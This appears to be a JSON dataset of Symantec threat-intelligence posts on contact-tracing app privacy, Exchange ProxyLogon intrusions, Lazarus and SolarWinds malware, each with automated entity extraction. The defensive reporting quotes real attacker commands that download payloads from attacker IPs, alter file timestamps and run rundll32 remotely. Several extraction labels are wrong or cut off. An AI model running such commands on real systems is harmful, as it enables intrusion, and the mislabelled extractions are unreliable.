Furthermore, the app should only be scanning and sending BLE signal data to its servers, but not to any other destinations. Depending on the use case of a particular app, a range of information may be needed for it to function as intended. For example, if the app is used by a business to trace its employees it may be set up so as to activate and start contact-tracing only within a certain GPS coordinate and conversely to stop once outside those coordinates without recording or sending any information. Furthermore, Wi-Fi data may be needed to justify cleaning/disinfection actions as a result of an infection notification. However, in any scenario, the user must be notified of such data collection. Any data the app is collecting must be clearly and accurately stated in the privacy policy and only collected with the user’s acknowledgment, or with their formal consent where local law so requires. On the other hand, such functionality would not usually be necessary for a nation-wide, publicly available, contact-tracing app The joint Google and AppleExposure Notification System, designed to be used by developers of COVID-19 tracing apps, is a framework that does the legwork \"for public health authorities to supplement their existing contact tracing operations with technology without compromising on the project’s core tenets of user privacy and security.” While this is a step in the right direction for users' privacy, it seems that few app developers have adopted the framework. Of all the apps we analyzed, we only saw one that used the earlier version of this system. The cloud-based Symantec App Analysis service performed static, dynamic, and behavioral app analysis for nation-wide, COVID-19 tracing apps publicly available from 31 different countries on the iOS and Android platforms. App analysis identifies apps following known security best practices and apps that impact and increase user privacy, security, and risk. App behaviors impacting privacy, security, and risk: App behaviors that follow best security practices: Generally, runtime permission models by Android and iOS protect users from apps collecting private data without their knowledge. That being said, there are some issues with the permission model that complicate privacy. In particular, Android COVID-19 contact tracing apps use Bluetooth technology. Android devices group Bluetooth permissions and location/GPS services together, requiring the app and app developer to request and gain access to GPS locations. We analyzed COVID-19 tracing apps available to the public from 31 different countries, identifying app behaviors impacting user privacy and security. Eight of the COVID-19 tracing apps were from countries within the EEA. For these apps we found the following: The remaining 23 COVID-19 tracing apps, which were from non-EEA countries, did noticeably worse: Overall, the diagnosis is grim. Our findings found over half of all countries’ COVID-19 tracing apps access device data containing personal information and fail to protect user data in transit. Our findings suggest that if you are using a COVID-19 tracing app from a non-EEA country, compared to one from an EEA nation, your risk increases by a factor of two. However, not all non-EEA apps performed quite as badly, as detailed in the following Examples section. The COVIDSafe tracing app from the Australian Department of Health hits the security sweet spot when it comes to COVID-19 tracing app. The privacy policy (https://covidsafe.gov.au/privacy-policy.html) clearly explains how and what personal information is collected and aligns with our analysis of the app. Furthermore, the in-app runtime permissions clearly state the reasons for requesting the privileges, as seen when asking for Bluetooth tracking: [{\"description\": \"COVIDSafe exchanges Bluetooth signals with nearby phones running the same app. These signals contain an anonymized ID, which is encrypted and changes continually to ensure your privacy.\"}] Meanwhile, at the other end of the spectrum, StopKorona! is a COVID-19 tracing app for Android and iOS from the Ministry of Health of the Republic of North Macedonia. It claims to be a \"mobile app developed based on the best global practices for the prevention and control of the Coronavirus. The app is intended to trace exposure with potentially infected persons, by the detection of the distance between mobile devices/applications by using Bluetooth technology.\" Furthermore, StopKorona! claims that: \"The only data related to you is your mobile telephone number, stored on a safe server managed by the Ministry of Health, to prevent the spreading of the virus.\" We found that the collected data claimed by the Ministry of Health is accurate. What we found inaccurate is the claim that the data is sent securely. Often we discover in analysis app developers disabling the security or integrity of network connections. This commonly happens when the servers receiving the data are not configured correctly, or the app libraries are not configured correctly. In any case, this disabling of validation of SSL certificate authorities (CAs) is intentional. Furthermore, if you were able to connect to the servers receiving your private data in a browser on the desktop, you would see a broken lock next to the URL showing the connection sending your private data is insecure. For mobile apps, there is no such lock visible to the user. App developers know this, often using it to pass the test of security while avoiding taking the time to properly and securely configure private data sent over the network. Access PII:Can Access MicrophoneCan Access CalendarCan Access Address BookAccesses Wi-Fi InfoAccesses Telephony Service Expose PII:Sends Data UnencryptedDisables SSL CA ValidationData Transport Security ExceptionsApp Disabled PFS for Specific Domains Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (COVID-19, Threat Type), (contact tracing app, Malware), (government, Attacker), (business, Attacker), (ge, Location)\nRelationships: (COVID-19, uses, contact tracing app), (government, develops, contact tracing app), (business, provides, contact tracing app)",
      "entities": [
        [
          "COVID-19",
          "Threat Type"
        ],
        [
          "contact tracing app",
          "Malware"
        ],
        [
          "government",
          "Attacker"
        ],
        [
          "business",
          "Attacker"
        ],
        [
          "ge",
          "Location"
        ]
      ],
      "relationships": [
        [
          "COVID-19",
          "uses",
          "contact tracing app"
        ],
        [
          "government",
          "develops",
          "contact tracing app"
        ],
        [
          "business",
          "provides",
          "contact tracing app"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 5,
    "relationship_count": 3
  },
  {
    "title": "microsoft exchange server protection",
    "link": "https://www.security.com/threat-intelligence/microsoft-exchange-server-protection",
    "content": "Blog updated March 11: Case studies detailing post-compromise activity seen by Symantec added, along with additional IoCs Blog updated March 9: IoCs, additional signatures, and pre-exploitation process diagram added. Users of Microsoft Exchange Server are advised to update to the latest version immediately, as a growing number of attackers are attempting to exploit four recently patched zero-day vulnerabilities in the software. Microsoft released emergency patches last week (March 2) for the four vulnerabilities, which were being exploited by attackers in the wild. At the time, Microsoft said these vulnerabilities were being exploited by an advanced persistent threat (APT) group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, since then it has been reported that multiple threat actors have been rushing to exploit these vulnerabilities in Exchange Server. Two of the vulnerabilities (CVE-2021-26855 and CVE-2021-27065) and the technique used to chain them together for exploitation have been given the name“ProxyLogon” by security company DevCore. Successful exploitation of ProxyLogon allows attackers to gain a foothold on a targeted network, potentially leading to further compromise and data exfiltration. Symantec customers are protected from attacks exploiting these vulnerabilities. Microsoft releasedan out-of-band patchto address the vulnerabilities in Exchange Server on March 2, 2020. The versions impacted are Exchange Server 2013, 2016, and 2019.Security firm Volexity, which Microsoft credited in its security alert detailing the vulnerabilities, said it first saw attackers exploiting the bugs on January 6, 2021. Successful exploitation of these vulnerabilities allows an unauthenticated attacker to execute arbitrary code on vulnerable Exchange Servers, allowing them to gain persistent system access, access to files and mailboxes on the server, and access to credentials stored on the system. Successful exploitation may also allow attackers to compromise trust and identity in a vulnerable network. This gives attackers extensive access to infected networks, allowing them to steal potentially highly sensitive information from victim organizations. The four zero-day vulnerabilities that Microsoft released emergency patches for are: The following diagram shows an attack chain that an attacker could employ to gain initial access to data. Hafnium, which Symantec tracks as Ant, was the group first seen exploiting the vulnerabilities in Exchange Server,according to Microsoft. It said at the time that Ant was exploiting the zero days to carry out “limited and targeted attacks.” Microsoft said Ant used the vulnerabilities “to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments.” Microsoft stated with “high confidence” that the group was state-sponsored and operating out of China. It also said the group principally attacked targets in the U.S., including infectious disease researchers, law firms, educational institutes, defense contractors, policy think tanks, and NGOs. Security firm Veloxityalso said the group was seen deploying web shells on infected systems to allow for remote access. Among the web shells Veloxity said it saw deployed were China Chopper variants and ASPXSPY. Veloxity also reported seeing the group carry out post-compromise activity such as credential dumping, lateral movement via PsExec, and archiving (likely in preparation for exfiltration of data). Microsoftalso reportedthat Ant deployed post-compromise tools such as Covenant, PowerCat, and Nishang. It is likely the group was using publicly available web shells and post-compromise tools in order to make attribution of the activity more difficult. No, since Microsoft released the emergency patches for these vulnerabilities on March 2, attacks attempting to exploit these vulnerabilities have escalated, with “multiple malicious actors beyond Hafnium” attempting to target unpatched systems, according to Microsoft. The initial attacks carried out by Ant appear to have been targeted, but the large number of threat actors now attempting to exploit these vulnerabilities mean these attacks are now more indiscriminate in nature. While Symantec customers are protected from attacks attempting to exploit those vulnerabilities, all users of Exchange Server are advised to update to the most recent version immediately. Microsoft has alsoreleased a detection toolthat allows you to scan your Exchange Server logs to determine if your server was compromised. The Cybersecurity and Infrastructure Security Agency (CISA) in the U.S. has advised that all users of Exchange Server scan their systems using Microsoft’s tool, as well as issuing anEmergency Directiveto instruct all federal agencies to immediately update their Exchange servers. Symantec researchers have observed post-compromise activity on a small number of customer machines, where attackers’ initial point of entry appears to have been through exploiting the vulnerabilities in Microsoft Exchange. In two cases, Symantec researchers observed activity prior to the release of Microsoft’s patches on March 2. In one victim, a telecoms company in the Middle East, we saw activity as far back as January 2021. China Chopper web shells were present on this victim’s network on January 13. China Chopper web shells were used by Ant (aka Hafnium) in the initial attacks leveraging these vulnerabilities according toreports by Veloxity. On January 29, a suspicious PowerShell command was executed to download files from a domain masquerading as a popular cloud hosting provider. A few days later, on February 1, a suspicious command was executed to create a scheduled task, which executed “debug.bat” several hours later. The task was named “test”, which may indicate that the attackers were using this as a way to test scheduled tasks. Some hours later, the attackers ran “net start vdir”, which was used to launch a service that had likely been installed by the attackers. On February 6, a suspicious file (sok.wia) was downloaded by the attackers and was used to establish a connection with a remote host. It is likely this connection was used by the attackers to assist in exfiltration because, shortly afterwards, credential-dumping tool Mimikatz was used to dump credentials from the system. The next day, the attackers again use sok.wia, before creating a scheduled task on a remote server (likely using stolen credentials) to execute a “server.bat” file. The next activity was seen on February 18 when Mimikatz was executed once again, and then on February 19 ProcDump was used to dump Isass to “he.dmp”, which can be used to harvest credentials. Then later, on March 3, a suspicious file was observed in %Temp%\\in.exe, followed by a suspicious file ({71736495-d485-477d-b836-17f0085e0780}.exe) being extracted via the WinRAR archive tool which creates a malicious file in %system%\\inetsrv\\XmlLite.dll. This was the last activity seen on this machine. Another victim, this one operating in the legal sector in Southeast Asia, saw activity on its network beginning on February 28. This was before Microsoft issued patches for the exploited vulnerabilities, but it has been reported by Veloxity that it saw activity ramping up since February 28, so it is possible information about these vulnerabilities had been leaked in the cyber crime fraternity by this time. The first activity on this machine on February 28 was a command used to dump credentials that was executed via the w3wp.exe process. On the same day ProcDump was used to dump Isass, which can be used to harvest credentials. The next day, March 1, a file called ‘uawmiver.exe’ was executed to bypass user account control (UAC). This was used to execute two batch files called “set.bat” and “set1.bat”. On March 3, a command was used to execute another unknown batch file, which was downloaded by bitsadmin from a remote host: &quot;CSIDL_SYSTEM\\bitsadmin.exe&quot; /rawreturn /transfer getfile http://89.34.111.11/3.avi CSIDL_PROFILE\\public\\2.bat We then saw obfuscated PowerShell commands being executed and used to download a file from a remote host. (new-object System.Net.WebClient).DownloadFile('hxxp://86.105.18.116/news/code','C:\\users\\public\\opera\\code') The next day, March 4, another PowerShell command was executed that searched for \"layout.aspx\" and \"iistart.aspx\". The last access and creation times were modified to August 21, 2017. powershell.exe -command &quot;dir |where {$_.name -eq 'layout.aspx' -or $_.name -eq 'iistart.aspx' }  | foreach-object { $_.LastWriteTime = '2017-08-21 20:26:57';$_.LastAccessTime = '2017-08-21 20:26:57';  $_.CreationTime = '2017-08-21 20:26:52' }&quot; This was likely done to help conceal the malicious files and thwart any incident response investigations. 7-Zip was then used to extract the contents of a ZIP archive (current.zip) that was uploaded to the Exchange server by the attackers, before the file “current.exe” was executed, which injected CobaltStrike beacon to a newly-created “svchost.exe” process for backdoor access.  Several hours after this, ntdsutil was used to dump credentials once again. Following this, a file called \"mv.exe\", which is likely Mimikatz, was executed to dump credentials. This is followed by ProcDump being used to dump lsass to harvest additional credentials. Shortly after this, an unknown file \"ccsvchst.exe\" was executed, which passes a collected hash. Finally, the attackers launched the publicly available \"secretsdump\" tool, to dump credentials stored in the registry. Then, on March 8, the attackers ran Mimikatz to try to dump credentials again. This was the last activity seen on this machine. We also observed some post-compromise activity in a small number of other organizations since Microsoft issued their patches on March 2, when activity ramped up significantly as it is believed a large number of threat actors were rushing to exploit these vulnerabilities. Some of the tools we saw used in post-compromise activity in those impacted since March 2 include: In one case we also saw the attackers deleting shadow copies from infected machines, which is activity we typically see when attackers are preparing to carry out a ransomware attack, though we did not observe ransomware deployed on the machine. The extensive use of living-off-the-land and open-source tools and tactics by the attackers leveraging these vulnerabilities make attribution of these attacks difficult and means that a wide number of different threat actors may be responsible for these attacks. With activity exploiting these vulnerabilities seen by Symantec as recently as March 9, these attacks are ongoing, and all users of Microsoft Exchange Server are urged to scan their environment and apply patches immediately. Data Center Security: For the latest protection updates, please visit theSymantec Protection Bulletin. The presence of the following indicators on your network may help you determine if you've already been exploited. .*(\\\\aspnet_client\\\\|\\\\owa\\\\auth\\\\|\\\\ecp\\\\auth\\\\).*\\.aspx X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3 S:CMD=Set-OabVirtualDirectory.ExternalUrl= /ecp/DDI/DDIService.svc/SetObject Microsoft Scanning Tool https://github.com/microsoft/CSS-Exchange/tree/main/Security The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Blog, Event), (Case studies, Named Entity), (IoCs, Named Entity), (pre-exploitation process diagram, Named Entity), (users, Attacker), (Microsoft Exchange Server, Tool), (four, Number), (zero-day vulnerabilities, Vulnerability), (Exchange Server, Tool), (Hafnium, Attacker), (Ant, Attacker), (ProxyLogon, Technique), (DevCore, Tool), (out-of-band patch, Tool), (Exchange Server, Tool), (March 2, Date)\nRelationships: (Blog, updated, March 11), (Blog, updated, March 9), (Case studies, detail, post-compromise activity), (IoCs, add, additional signatures), (IoCs, add, pre-exploitation process diagram), (users, advise, update), (users, affectedBy, Microsoft Exchange Server), (users, affectedBy, Exchange Server), (Exchange Server, release, emergency patches), (Exchange Server, release, out-of-band patch), (Exchange Server, release, March 2), (Exchange Server, affectedBy, zero-day vulnerabilities), (Exchange Server, affectedBy, ProxyLogon), (Exchange Server, affectedBy, CVE-2021-26855), (Exchange Server, affectedBy, CVE-2021-27065), (Exchange Server, affectedBy, APT group), (Exchange",
      "entities": [
        [
          "Blog",
          "Event"
        ],
        [
          "Case studies",
          "Named Entity"
        ],
        [
          "IoCs",
          "Named Entity"
        ],
        [
          "pre-exploitation process diagram",
          "Named Entity"
        ],
        [
          "users",
          "Attacker"
        ],
        [
          "Microsoft Exchange Server",
          "Tool"
        ],
        [
          "four",
          "Number"
        ],
        [
          "zero-day vulnerabilities",
          "Vulnerability"
        ],
        [
          "Exchange Server",
          "Tool"
        ],
        [
          "Hafnium",
          "Attacker"
        ],
        [
          "Ant",
          "Attacker"
        ],
        [
          "ProxyLogon",
          "Technique"
        ],
        [
          "DevCore",
          "Tool"
        ],
        [
          "out-of-band patch",
          "Tool"
        ],
        [
          "Exchange Server",
          "Tool"
        ],
        [
          "March 2",
          "Date"
        ]
      ],
      "relationships": [
        [
          "Blog",
          "updated",
          "March 11"
        ],
        [
          "Blog",
          "updated",
          "March 9"
        ],
        [
          "Case studies",
          "detail",
          "post-compromise activity"
        ],
        [
          "IoCs",
          "add",
          "additional signatures"
        ],
        [
          "IoCs",
          "add",
          "pre-exploitation process diagram"
        ],
        [
          "users",
          "advise",
          "update"
        ],
        [
          "users",
          "affectedBy",
          "Microsoft Exchange Server"
        ],
        [
          "users",
          "affectedBy",
          "Exchange Server"
        ],
        [
          "Exchange Server",
          "release",
          "emergency patches"
        ],
        [
          "Exchange Server",
          "release",
          "out-of-band patch"
        ],
        [
          "Exchange Server",
          "release",
          "March 2"
        ],
        [
          "Exchange Server",
          "affectedBy",
          "zero-day vulnerabilities"
        ],
        [
          "Exchange Server",
          "affectedBy",
          "ProxyLogon"
        ],
        [
          "Exchange Server",
          "affectedBy",
          "CVE-2021-26855"
        ],
        [
          "Exchange Server",
          "affectedBy",
          "CVE-2021-27065"
        ],
        [
          "Exchange Server",
          "affectedBy",
          "APT group"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 16,
    "relationship_count": 16
  },
  {
    "title": "lazarus north korea indictment",
    "link": "https://www.security.com/threat-intelligence/lazarus-north-korea-indictment",
    "content": "The U.S. government hascharged three men in relation to a string of financially motivated cyber attackslinked to the North Korean Lazarus (aka Appleworm) group. The attackers stole approximately $1.3 billion from a range of financial institutions and cryptocurrency exchanges. In a second case, a Canadian-American citizen has pleaded guilty to involvement in a money laundering scheme linked to heists organized by the Lazarus group. The charges relate to a number of financially motivated attacks, including several investigated by Symantec, a division of Broadcom (NASDAQ: AVGO). Lazarus was linked to a 2016 attack thatstole US$81 million from the Bangladesh Central Bank and a number of other attacks against banks in Asia and South America. The attacks prompted an alert by payments network SWIFT, after it was found that the attackers had used malware to cover up evidence of fraudulent transfers. In order to steal such massive sums, the attackers deployed relatively sophisticated malware, most notably Trojan.Banswift, which was used to wipe evidence of fraudulent transactions. Banswift shared code with an older Lazarus tool called Backdoor.Contopee. Contopee, along with two other pieces of Lazarus malware, Backdoor.Fimlis and Backdoor.Fimlis.B, were already being used in limited targeted attacks against the financial sector in South-East Asia. Financially motivated attacks continued into 2017,when dozens of organizations were targeted through watering-hole attacks involving a previously unseen piece of malware. The attackers compromised websites likely to be visited by staff at targeted organizations and used a custom exploit kit to deliver malware to selected targets. The exploit kit was configured to only infect visitors from approximately 150 different IP addresses. These IP addresses belonged to 104 different organizations located in 31 different countries, most of which were banks. While the malware used in these attacks (Downloader.Ratankba) had been previously unseen, further analysis by Symantec uncovered strong links between this tool and known Lazarus tools. Lazarus was subsequently implicated in theWannaCry ransomware attacks. The ransomware incorporated the leaked EternalBlue exploit that used two known vulnerabilities in Windows (CVE-2017-0144and CVE-2017-0145) to turn the ransomware into a worm, capable of spreading itself to any unpatched computers on the victim’s network and also to other vulnerable computers connected to the internet. Within a matter of hours, the malware had infected hundreds of thousands of computers worldwide. The attack had the potential to be highly profitable but it was poorly executed. WannaCry was supposed to generate a unique Bitcoin wallet address for each infected computer but, due to a bug, it failed to do so and instead defaulted to three hardcoded Bitcoin addresses for payment. This meant the attackers had no way of knowing which victims had paid using the hardcoded addresses. The attackers also included a “killswitch” in the malware. This was the address of a non-existent domain. WannaCry was designed to check if the domain was live and, if it was, it would cease installing. However, it was quickly found by a security researcher who registered the domain themselves, thus limiting the damage. The group’s interest in financially motivated attacks persisted and, in 2018, evidence appeared of its involvement in attacks on ATM networks in Africa and Asia.The operation, known as FASTCash, allowed the group to effectively empty ATMs of cash. The attacks began with breaches of the targeted bank’s network in order to gain access to the switch application server that handled ATM transactions. Malware (Trojan.Fastcash) was installed on the server and used to intercept fraudulent cash withdrawal requests and send falsified approval responses, allowing cash to be withdrawn. In a related announcement, the FBI, the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Treasuryreleased details on AppleJeus, malware that was used in a series of attacks on cryptocurrency exchanges. The malware is designed to masquerade as legitimate cryptocurrency trading applications. At least seven different versions of AppleJeus have been discovered, each of which is designed to target a different cryptocurrency trading application. The following trading platforms were targeted by the malware: Initially the malware was spread using fake versions of the legitimate trading platform websites. However, later the attackers switched vectors, relying on phishing, social networking, and social engineering techniques to fool victims into downloading the malware. The indictment is the latest in a series of charges laid out against state-sponsored espionage actors by authorities in the U.S. and comes on the back ofa 2018 indictmentagainst one of the men named in this week’s announcement. The charges are a timely reminder of the ability of law enforcement to investigate attacks that originate far beyond national borders. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (U.S. government, Entity), (North Korean Lazarus (aka Appleworm) group, Attacker), (Bangladesh Central Bank, Victim), (Symantec, Tool), (SWIFT, Tool), (Banswift, Malware), (Backdoor.Contopee, Malware), (Contopee, Malware), (Backdoor.Fimlis, Malware), (Backdoor.Fimlis.B, Malware)\nRelationships: (U.S. government, charged, North Korean Lazarus (aka Appleworm) group), (North Korean Lazarus (aka Appleworm) group, uses, Banswift), (North Korean Lazarus (aka Appleworm) group, uses, Backdoor.Contopee), (North Korean Lazarus (aka Appleworm) group, uses, Contopee), (North Korean Lazarus (aka Appleworm) group, uses, Backdoor.Fimlis), (North Korean Lazarus (aka Appleworm) group, uses, Backdoor.Fimlis.B), (North Korean Lazarus (aka Appleworm) group, linkedTo, Bangladesh Central Bank), (North Korean Lazarus (aka Appleworm) group, linkedTo, SWIFT), (North Korean Lazarus (aka Appleworm) group, linkedTo, multiple attacks), (North Korean Lazarus (aka Appleworm) group, linkedTo, multiple attacks), (North Korean Lazarus (aka Appleworm) group, linked",
      "entities": [
        [
          "U.S. government",
          "Entity"
        ],
        [
          "Bangladesh Central Bank",
          "Victim"
        ],
        [
          "Symantec",
          "Tool"
        ],
        [
          "SWIFT",
          "Tool"
        ],
        [
          "Banswift",
          "Malware"
        ],
        [
          "Backdoor.Contopee",
          "Malware"
        ],
        [
          "Contopee",
          "Malware"
        ],
        [
          "Backdoor.Fimlis",
          "Malware"
        ],
        [
          "Backdoor.Fimlis.B",
          "Malware"
        ]
      ],
      "relationships": [
        [
          "U.S. government",
          "charged",
          "North Korean Lazarus (aka Appleworm"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 1
  },
  {
    "title": "solarwinds sunburst sending data",
    "link": "https://www.security.com/threat-intelligence/solarwinds-sunburst-sending-data",
    "content": "In ourprevious blogwe described how the attackers controlled the Sunburst malware, and detailed a variety of commands that will result in data being sent to the threat actors. The next technique to discuss is how Sunburst sends this data to the attackers. If data is being sent to the attacker as a result of a command, instead of performing a HTTP(S) GET request, something we described in our last blog, Sunburst initiates a HTTP(S) POST request. Sunburst uses randomly generated URL paths for HTTP(S) POST requests that are different from HTTP(S) GET requests. If the data to send is greater than 10,000 bytes, the URL path will be as follows: A Content-Type header is set to application/octet-stream and the POST data follows. The POST data consists of the data to send UTF8 encoded, concatenated with the last error code, concatenated with the userid, and subsequently compressed. Every byte of the compressed blob is then summed and the lowest byte of the sum value is used as a key. The compressed blob is XOR’d by the key byte and the key byte is prepended to the encrypted data. If the data to send is less than, or equal to, 10,000 bytes, the URL path will take one of two forms as follows: Further, instead of sending the encrypted data directly, as when the data is greater than 10,000 bytes, the data is steganographically sent in a faux JSON blob. The JSON blob contains the following fields: The encrypted data to send is broken into multiple variable sized chunks. The size of each chunk is randomly determined, but generally will go from smaller to larger. If the randomly chosen size is 0, a random chunk between 16 and 28 bytes is generated instead and the Timestamp value is AND’d with the value 18446744073709551613, which more importantly sets the second bit to 0. Each chunk is then encoded and added to the JSON blob and sent as the HTTP(S) POST data with a Content-Type header set to application/json. On receipt, the attacker will need to decode and concatenate all the Message chunks, skipping junk chunks where the Timestamp second bit is not set. This blog is the final installment of our analysis series concerning the command and control (C&C) process used by the actors behind the SolarWinds attacks. Previous entries have covered how the attackers used Sunburst todisable security software and avoid detection, the malware's use of arare domain generation algorithm(DGA) to generate domain names to contact for C&C purposes, and Sunburst's control flow anduse of IP address values as commands. This final blog, detailing how the malware sends data back to the attackers, rounds out a comprehensive overview of Sunburst’s C&C processes. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Sunburst, Malware), (HTTP(S) POST request, Technique), (Content-Type, Header), (UTF8, Encoding), (userid, Variable), (AES, Algorithm), (steganography, Technique), (falsely, Adjective)\nRelationships: (Sunburst, uses, HTTP(S) POST request), (Sunburst, uses, Content-Type), (Sunburst, uses, UTF8), (Sunburst, uses, AES), (Sunburst, uses, steganography), (Sunburst, uses, falsely)",
      "entities": [
        [
          "Sunburst",
          "Malware"
        ],
        [
          "Content-Type",
          "Header"
        ],
        [
          "UTF8",
          "Encoding"
        ],
        [
          "userid",
          "Variable"
        ],
        [
          "AES",
          "Algorithm"
        ],
        [
          "steganography",
          "Technique"
        ],
        [
          "falsely",
          "Adjective"
        ]
      ],
      "relationships": [
        [
          "Sunburst",
          "uses",
          "HTTP(S"
        ],
        [
          "Sunburst",
          "uses",
          "Content-Type"
        ],
        [
          "Sunburst",
          "uses",
          "UTF8"
        ],
        [
          "Sunburst",
          "uses",
          "AES"
        ],
        [
          "Sunburst",
          "uses",
          "steganography"
        ],
        [
          "Sunburst",
          "uses",
          "falsely"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 6
  },
  {
    "title": "solarwinds raindrop malware",
    "link": "https://www.security.com/threat-intelligence/solarwinds-raindrop-malware",
    "content": "Symantec, a division of Broadcom (NASDAQ: AVGO), has uncovered an additional piece of malware used in the SolarWinds attacks which was used against a select number of victims that were of interest to the attackers. Raindrop (Backdoor.Raindrop) is a loader which delivers a payload of Cobalt Strike. Raindrop is very similar to the already documented Teardrop tool, but there are some key differences between the two. While Teardrop was delivered by the initial Sunburst backdoor (Backdoor.Sunburst), Raindrop appears to have been used for spreading across the victim’s network. Symantec has seen no evidence to date of Raindrop being delivered directly by Sunburst. Instead, it appears elsewhere on networks where at least one computer has already been compromised by Sunburst. In one victim, in early July 2020, Sunburst was installed through the SolarWinds Orion update, as has been well documented. Two computers were compromised. The following day, Teardrop was subsequently installed on one of these computers. That computer was found to have an active directory query tool, as well as a credential dumper designed specifically for SolarWinds Orion databases. The credential dumper was similar to, but not the same as, theopen source Solarflaretool. Eleven days later, on a third victim computer in the organization, where no previous malicious activity had been observed, a copy of the previously unseen Raindrop was installed under the name bproxy.dll. This computer was running computer access and management software. The attackers could have used this software to access any of the computers in the compromised organization. One hour later, the Raindrop malware installed an additional file called \"7z.dll\". We were unable to retrieve this file, however, within hours a legitimate version of 7zip was used to extract a copy of what appeared to be Directory Services Internals (DSInternals) onto the computer. DSInternals is a legitimate tool which can be used for querying Active Directory servers and retrieving data, typically passwords, keys, or password hashes. An additional tool called mc_store.exe was later installed by the attackers on this computer. The tool is an unknown PyInstaller packaged application. No further activity was observed on this computer. In a second victim where the Raindrop loader was seen, it was installed in a file called astdrvx64.dll in late May. Several days later, in early June, PowerShell commands were executed on that computer, attempting to execute further instances of Raindrop on additional computers in the organization. \"Invoke-Command -ComputerName REDACTED -ScriptBlock { rundll32 c:\\Packages\\Plugins\\Microsoft.Powershell.DSC\\2.77.0.0\\bin\\TelemetryStatus.dll Tk_CreateItemType}\" \"Invoke-WMIMethod win32_process -name create -argumentlist 'rundll32 c:\\windows\\Speech_OneCore\\Engines\\TTS\\en-US\\enUS.Media.dll TkChangeEventWindow' -ComputerName REDACTED\" In a third victim, where Raindrop was seen, the instance of Cobalt Strike that was extracted did not have a HTTP-based command and control server, but was rather configured to use a network pipe over SMB (\\\\.\\pipe\\protected_storage[REDACTED]). It's possible that in this instance, the victim computer did not have direct access to the internet, and so command and control was routed through another computer on the local network. Raindrop is similar to Teardrop in that both pieces of malware act as a loader for Cobalt Strike Beacon. Raindrop uses a custom packer to pack Cobalt Strike. This packer is different to the one used by Teardrop. Raindrop is compiled as a DLL, which is built from a modified version of 7-Zip source code. The 7-Zip code is not utilized and is designed to hide malicious functionality added by the attackers. The DLL is compiled where the Name file of the Export Directory Table is “\"7-zip.dll\" and the Export Names are: And one of the following, selected at random: The Export Names used seem to overlap with names used by Tcl/Tk projects (seehereandhere). Whenever the DLL is loaded, it starts a new thread from the DllMain subroutine that executes the malicious code. This malicious thread performs the following actions: In order to locate the start of the encoded payload, the packer uses steganography by scanning the bytes starting from the beginning of the subroutine and skipping any bytes until the first occurrence of the following bytes that represent operation codes (opcodes) of interest: .data:0000000180053008 opcodes         db 5, 0Dh, 15h, 1Dh, 25h, 2Dh, 35h, 3Dh, 0B8h The malware will then perform the following actions: Although Raindrop is very similar to Teardrop, there are some key differences between the tools. As mentioned previously, Raindrop uses a different packer. The packers differ in the following ways: While both malware families are designed to deploy Cobalt Strike Beacon, there are differences in Cobalt Strike configuration. To date, Symantec has seen four samples of Raindrop. In three cases, Cobalt Strike was configured to use HTTPS as a communication protocol. In the fourth it was configured to use SMB Named Pipe as a communication protocol. All three Raindrop samples using HTTPS communication follow very similar configuration patterns as previously seen in one Teardrop sample (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07). The most important similarities are highlighted below. All of the aforementioned domains use a common Registrar, NameSilo, LLC and, except for panhardware[.]com, which is currently sinkholed, have common name servers: The discovery of Raindrop is a significant step in our investigation of the SolarWinds attacks as it provides further insights into post-compromise activity at organizations of interest to the attackers. While Teardrop was used on computers that had been infected by the original Sunburst Trojan, Raindrop appeared elsewhere on the network, being used by the attackers to move laterally and deploy payloads on other computers. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: For the latest protection updates, please visit theSymantec Protection Bulletin. The Yara rules are alsoavailable for downloadon GitHub. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
